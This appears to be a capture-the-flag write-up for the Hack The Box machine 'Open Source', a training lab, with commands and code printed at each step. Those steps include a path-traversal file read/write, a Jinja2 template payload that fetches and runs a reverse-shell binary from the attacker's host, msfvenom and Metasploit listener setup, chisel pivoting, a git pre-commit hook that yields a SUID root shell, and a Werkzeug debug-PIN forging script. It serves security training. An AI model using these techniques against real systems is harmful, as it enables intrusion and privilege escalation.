---
layout: post
title: Hack The Box - Open Source
---

Open Source is an "easy" box released by [HackTheBox](https://www.hackthebox.eu). I've completed quite a few machines on HackTheBox now and this is one of the hardest easy boxes I've done. Let's see how I did it, with a bonus alternative to the foothold at the end.


COMPLETION IMAGE HERE


## Summary
We use an arbitrary file write  in a flask application to write a template file including a code execution statement that would typically be achieved with STTI. This rewards us with a shell inside a docker container. From here we find an internal service hosting a git repository which contains an SSH key.

To gain root we take advantage of a root cron job that is backing up our home directory. We have write access to the `.git` directory allowing us to add a pre-commit hook that will run during the cron job granting us code execution as root.

## Enumeration

### rustscan
```shell
> rustscan -a "$1" --ulimit 5000 -b 400 -t 7500  -- -sC -sV -oN "./scans/$1"

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.164:22
Open 10.10.11.164:80

[~] Starting Script(s)

# Nmap 7.92 scan initiated Mon May 23 12:59:41 2022 as: nmap -vvv -p 22,80 -sC -sV -oN 10.129.69.167 10.129.69.167
Nmap scan report for 10.129.69.167
Host is up, received conn-refused (0.029s latency).
Scanned at 2022-05-23 12:59:41 EDT for 91s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8=
|   256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
80/tcp open  http    syn-ack Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 23 May 2022 16:59:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 23 May 2022 16:59:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=5/23%Time=628BBD83%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Mon,\x2023\x20May\x202022\x2016:59:49\x20GMT"

...SNIP
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 23 13:01:12 2022 -- 1 IP address (1 host up) scanned in 91.44 seconds

```

### nmap
```shell
> nmap -T4 -sS -p- $1 -Pn -oN ./scans/$1-full


Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 12:40 EDT
Nmap scan report for 10.10.11.164
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 36.64 seconds

> nmap --top-ports 100 -sUV $1 -oN ./scans/$1-UDP100

# Nmap 7.92 scan initiated Thu Jun  2 12:40:47 2022 as: nmap --top-ports 100 -sUV -oN ./scans/10.10.11.164-UDP100 10.10.11.164
Nmap scan report for 10.10.11.164
Host is up (0.039s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  2 12:44:13 2022 -- 1 IP address (1 host up) scanned in 205.99 seconds


```

## Foothold

On port 80 there is a file transfer web application, the source code is available for download.

[![](/assets/image/attachments/Pasted&#32;image&#32;20220529145721.png)](/assets/image/attachments/Pasted&#32;image&#32;20220602175603.png){:.glightbox}

Additionally there is a live version available at http://10.10.11.164/upcloud

### Source code review
The application is a flask webserver running in Docker. The application allows uploading files. We see there is a recursive replace on ../ in the file name to prevent directory traversal during the upload.

The interesting sections of the source code are:
```python

# views.py
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
	if request.method == 'POST':
		f = request.files['file']		
		file_name = get_file_name(f.filename)		
		file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)		
		f.save(file_path)
		return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)	
	return render_template('upload.html')

  
  

@app.route('/uploads/<path:path>')
def send_report(path):
	path = get_file_name(path)
	return send_file(os.path.join(os.getcwd(), "public", "uploads", path))



# utils.py

def get_file_name(unsafe_filename):
	return recursive_replace(unsafe_filename, "../", "")


def get_unique_upload_name(unsafe_filename):
	spl = unsafe_filename.rsplit("\\.", 1)
	file_name = spl[0]
	file_extension = spl[1]
	return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


def recursive_replace(search, replace_me, with_me):
	if replace_me not in search:
		return search
	return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

The application folder we download is actually a git repository, so we can look for other branches
```shell
> git branch  
  
  dev
* public

```

There are only two commits on public, we see with `git diff` the newer only removes a commented out FLASK_DEBUG=1 option.

Looking at the dev branch with `git checkout dev` we see some more interesting things. The source code of the application seems unchanged, but the FLASK_DEBUG option we saw commented out in the older public commit is now enabled.

```dockerfile

...SNIP

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Set mode
ENV MODE="PRODUCTION"
ENV FLASK_DEBUG=1

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]

```

We can now look on the dev branch for previous commits using `git log`

```shell
> git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial


```

Looking through these commits, there is something interesting on a76f8f75f7a4a12b706b0cf9c983796fa1985820. The repository at this point can be viewed by checking out the commit id `git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820`

There is now a `.vscode` directory in the root of `app/`. Inside is a `settings.json` used to connect to a proxy
```json
{
	"python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
	"http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
	"http.proxyStrictSSL": false
}
```

There are credentials used to connect to the proxy. I tried to use these to log into ssh but no dice. Let's note these down for later and move on

### Live version
On the main page we see a link to the live version
![](images/attachments/Pasted%20image%2020220602191605.png)

It is a basic file upload application
![](images/attachments/Pasted%20image%2020220602191421.png)

Simply clicking upload without selecting a file we can trigger an error.

![](images/attachments/Pasted%20image%2020220602191822.png)
We see debug mode is enabled, so it seems the live version is from the dev branch we found in the repository. So now, we can use the interactive python shell to get a reverse shell right? not so fast, there is a debugging pin enabled

![](images/attachments/Pasted%20image%2020220602192015.png)

At this point I did a deep dive into the how the debug pin for Werkzeug (which flask is using) calculates the debug pin. Some of the articles I looked at are:

- [Hacktricks - Werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
- [Daehee Park](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [TetCTF2020 writeup](https://ctftime.org/writeup/17955)
- [Werkzeug debug pin in docker](https://pythonawesome.com/werkzeug-has-a-debug-console-that-requires-a-pin-by-default/)

I didn't actually manage to forge a pin successfully to acquire foothold, but let's come back to this later...

### Source code - vulnerability
```python
...SNIP

@app.route('/', methods=['GET', 'POST'])
def upload_file():
	if request.method == 'POST':
		f = request.files['file']		
		file_name = get_file_name(f.filename)		
		file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)		
		f.save(file_path)
		return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)	
	return render_template('upload.html')   

@app.route('/uploads/<path:path>')
def send_report(path):
	path = get_file_name(path)
	return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

we see if both cases os.path.join is used to generate paths for files on the server. Let's take a closer look.

[Documentation](https://docs.python.org/3/library/os.path.html#os.path.join)

>" If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component."

We control the last argument in both os.path.join, the name of the file for the upload_file function and the path after `upload/` in the send_report function. So this means if we can get an absolute path to a file into one of these arguments the preceding values should be discarded and only our provided path used. Let's do a basic proof of concept to be sure 

```python
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "/etc/passwd")
'/etc/passwd'
```

Great, but one problem for send_report, we cannot use an absolute path directly on the URL, but...

what if we use the replace functionality to generate a absolute path? let's recap on the recursive replace

```python
...SNIP

def get_file_name(unsafe_filename):
	return recursive_replace(unsafe_filename, "../", "")

... SNIP

def recursive_replace(search, replace_me, with_me):
	if replace_me not in search:
		return search
	return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

"../" is replaced with "", or nothing so, `..//etc/passwd` replaced to `/etc/passwd` meaning we can provide a url like:

`http://10.10.11.164/uploads/%2e%2e%2f<absolute_path>`  - note: urlencode(../) = %2e%2e%2f

To get read access to any readable file on the server.

By the same reasoning as just stated, we can an arbitrary file write on the server by manipulating the `file_name` parameter, except this time we do not need to use the replace technique to get an absolute filename, we can provide it directly

I create a test file and write it somewhere publicly readable  to confirm the arbitrary file write

```shell
echo "test" > test.txt
```


![](images/attachments/Pasted%20image%2020220602195921.png)

![](images/attachments/Pasted%20image%2020220602195947.png)

We have what we need for RCE now. Debug mode means that files will be automatically reloaded upon being changed. So we may overwrite a template with a malicious version to allow code execution through Jinja2.

Steps:
1. arbitrary write vulnerability
2. write a template success.html to `/app/app/templates/success.html`
3. load our template with SSTI RCE in it

I used success.html from the source code and included my payload [found here](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) 

```html 

...SNIP

<button class="btn btn-success" type="button" id="btnCopy">

 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('wget <MYIP>:9090/rev && chmod +x rev && ./rev')['read']()}}

</button>

...SNIP


```

I am using metasploit here for some practice with and the convenience it offers, but this could be done just as easily with a standard reverse shell payload. "rev" is a msfvenom binary I generated to give me a meterpreter shell. After this I started up a python http server on port 9090  in the same directory to host it so my payload will reach out and execute it

```shell
> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf -o rev

... SNIP

> python3 -m simple.http 9090
```

Now I start up metasploit and setup my listener
```shell
msfconsole -r ~/msfrc/linux_x86_meterpreter_staged.rc
```

I am using an .rc file here to automate setting up my listener, this option will automatically submit these commands upon starting metasploit.

```shell
> cat ~/msfrc/linux_x86_meterpreter_staged.rc       
use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run -j
 
```

Now all that is left is to upload the template and trigger the exploit. I upload success.html and intercept with burp as shown above to change the file_name to the absolute path of  `/app/app/templates/success.html` . On a successful upload the page automatically navigates to our now malicious `success.html` and triggers our command. Our rev binary is retrieved and executed, granting us a meterpreter shell

## User
With basic enumeration nothing stands out immediately. It is a docker container as we suspected. I remembered the port 3000 service that was filtered from earlier. It wasn't running locally so I tried other hosts in the docker network.

```bash
meterpreter > run autoroute -s 172.17.0.0/24
```

portscan 172.17.0.1 (determined this to be main host)

rhosts => 172.17.0.1
```shell
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.17.0.1
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.17.0.1: - 172.17.0.1:22 - TCP OPEN
[+] 172.17.0.1: - 172.17.0.1:80 - TCP OPEN
[+] 172.17.0.1: - 172.17.0.1:3000 - TCP OPEN
```


after some messing around with meterpreter portforwards, they were unbearably slow, so I used chisel

transport the binary with meterpreter upload and then


```shell
# using meterpreter
meterpreter> upload /opt/chisel/chisel_1.7.6_linux_amd64 .


# on victim

> ./chisel_1.7.6_linux_386 client 10.10.14.241:13897 R:172.17.0.1:3000

# on attacker machine

> ./chisel_1.7.6_linux_amd64 server -v -p 13897 --reverse
 

```  

This will allow me to access port 3000 on localhost, which would connect to 172.17.0.1:3000

Navigating to it we see a webapp called Gitea, it appears to be a service for managing Git repositories I haven't encountered before. Remembering the credentials we found earlier,

dev01:Soulless_Developer#2022

I try to log in and I am granted access. here we see a repository which is a backup of dev01's home directory. Luckily for us, this includes their RSA private key

we can download it and use it to authenticate against SSH on the box

http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa

now login as dev01
```shell
ssh dev01@<IP> -i ./id_rsa
```

This grants us user.txt
## Privilege Escalation
I performed my usual checklist of enumeration and nothing stuck out immediately. So, I decided to look at process activity with `pspy`. We see some git commands executed by root on frequent intevals

```shell

...SNIP

2022/05/23 23:55:01 CMD: UID=0 PID=22703 | /bin/bash /usr/local/bin/git-sync
2022/05/23 23:55:01 CMD: UID=0 PID=22702 | /bin/sh -c /usr/local/bin/git-sync
2022/05/23 23:55:01 CMD: UID=0 PID=22701 | /usr/sbin/CRON -f
2022/05/23 23:55:01 CMD: UID=0 PID=22704 | git status --porcelain
2022/05/23 23:55:01 CMD: UID=0 PID=22706 | git add .
2022/05/23 23:55:01 CMD: UID=0 PID=22707 | git commit -m Backup for 2022-05-23
2022/05/23 23:55:01 CMD: UID=0 PID=22708 | git push origin main
2022/05/23 23:55:01 CMD: UID=0 PID=22709 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git

...SNIP

```

It must been a root cron job. We find the script responsible in /usr/local/bin/git-sync

```bash

#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
	echo "No changes"
else
	day=$(date +'%Y-%m-%d')
	echo "Changes detected, pushing.."
	git add .
	git commit -m "Backup for ${day}"
	git push origin main
fi

```

It is backing up our home directory, /home/dev01. We have write access to the .git directory.
With some research on git escalation techniques I found this on [gttfobins](https://gtfobins.github.io/gtfobins/git/#sudo). This allows us to execute a shell script before a commit. We add a script in the .git/hooks/ directory that will be run as root when they use that action!

let's make a suid copy of bash

```shell
#!/bin/bash
cp /bin/bash /tmp/sbash
chmod +s /tmp/sbash
```

make it executable and place it at `.git/hooks/pre-commit`. Now we simply need to wait for the root cronjob and you should get a suid bash in `/tmp`. Run `/tmp/sbash -p` for a root shell.

## Addendum - alternative foothold
I discovered after completing this box that forging the Werkzeug debugger pin to achieve foothold *is in fact possible*. Credit goes to Opcode#8430 from the HackTheBox discord who helped me get this method functional.

From all the articles I looked at the most applicable was [Werkzeug debug pin in docker](https://pythonawesome.com/werkzeug-has-a-debug-console-that-requires-a-pin-by-default/) which also looked at forging the pin from Werkzeug running in docker. 

I took their script and modified the public and private bits that are used in the pin calculation

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'root',# username, changed, our container runs as root
	'flask.app',# modname, same for me
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) same for me
	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), python3.10
]

private_bits = [
	# /sys/class/net/eth0/address, see calculation 
	'', 
	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup SPECIFIC FORMAT SEE CODE
	''
]

...SNIP  # will include full script at end
```
The public bits need minimal change, but for the private bits we will need to use our file read discussed earlier. This is where I hit problems that ultimately led me to abandon this path during my inital work on the box.

Trying to download `/sys/class/net/eth0/address ` we encounter an error

![](images/attachments/Pasted%20image%2020220602205458.png)
and when trying to download the machine id files they are empty
![](images/attachments/Pasted%20image%2020220602205620.png)

This is the same for 
- `http://<IP>/uploads/..%2f%2fproc%2fsys%2fkernel%2frandom%2fboot_id`
- `http://<IP>/uploads/..%2f%2fetc%2fmachine-id`
- `http://<IP>/uploads/..%2f%2fproc%2fself%2fcgroup`

When comparing notes with Opcode, they mentioned using burp repeater rather the browser for the download and sure enough we I try this method I can get the file contents just fine, so what's the problem here?

![](images/attachments/Pasted%20image%2020220602210137.png)
![](images/attachments/Pasted%20image%2020220602210214.png)

This is when Opcode realised, since we are reading kernelland files they do not behave the same as normal files in some ways. 

> In Unix-like operating systems, a device file or special file is an interface for a device driver that appears in a file system as if it were an ordinary file. 
> [...] They allow software to interact with a device driver using standard input/output system calls, which simplifies many tasks and unifies user-space I/O mechanisms.

The key one here being the size of the file for many of them is 0 (and for one file we are interested in 4096)

![](images/attachments/Pasted%20image%2020220602210733.png)
The value was being set as the Content-Length header in the HTTP response, meaning for the `/proc` files the body was ignored and for `/sys/class/net/eth0/address` it lead to an error in what I am guessing is a problem retrieving a file much smaller than the Content-Length indicated.

Now with that out of the way, we can continue with forging the pin. I tried to automate this all with a python script, but I found some parts I had to do manually (because of the content length issue I wasn't able to read response content with python). So I manually download the following files and placed them into the same directory of my script:
-  `/sys/class/net/eth0/address`
- `/proc/sys/kernel/random/boot_id`
- `/proc/self/cgroup`
- `/etc/machine-id` - would normally be needed but did not exist on the system

The private address bit can be calculated by reading `/sys/class/net/eth0/address` and performing some formating. The article I mentioned above gave a method to do this in the interpreter, and I modified this slightly to work entirely with my script

```python
# provided method

Python 3.9.7 (default, Sep  3 2021, 02:02:37) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "".join("02:42:ac:11:00:04".split(":"))
'0242ac110004'
>>> print(0x0242ac110004)
2485377892356


# my method


with open("address", "rb") as f:  # /sys/class/net/eth0/address from server
	value = f.readline().decode().strip()

private_addres = str(int("".join(value.split(":")), 16))
```

likewise for the machine_id private bit, the article provided some code to read the files and concatenate them with some formatting. The only thing I changed here was to read files from the local directory (which I had downloaded from the server)

```python
machine_id = b""

for filename in "machine-id", "boot_id":

	try:	
		with open(filename, "rb") as f:	
			value = f.readline().strip()	
	except OSError:	
		continue	
	if value:	
		machine_id += value
	break

try:
	with open("cgroup", "rb") as f:
		machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
	pass

  
private_id = machine_id.decode()
```

Putting it altogether we get our complete script

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        'root',# username  - changed, our applications runs as root
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.10/site-packages/flask/app.py' # we have 3.10
]


# format address
with open("address", "rb") as f:
    value = f.readline().decode().strip()


private_addres = str(int("".join(value.split(":")), 16))

print(private_addres)

# Read files for machine id
machine_id = b""
for filename in "machine-id", "boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue
    if value:
        machine_id += value
    break

try:
    with open("cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

private_id = machine_id.decode()

private_bits = [
        private_addres,
        private_id
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print("Pin: " + rv) 

```

now running
```shell
> python3 rawe-exploit.py
Pin: 574-249-862

```

We navigate to `http://<IP>/console` and submit our pin, granting access.

![](images/attachments/Pasted%20image%2020220602214059.png)
excuse my mistake here :p

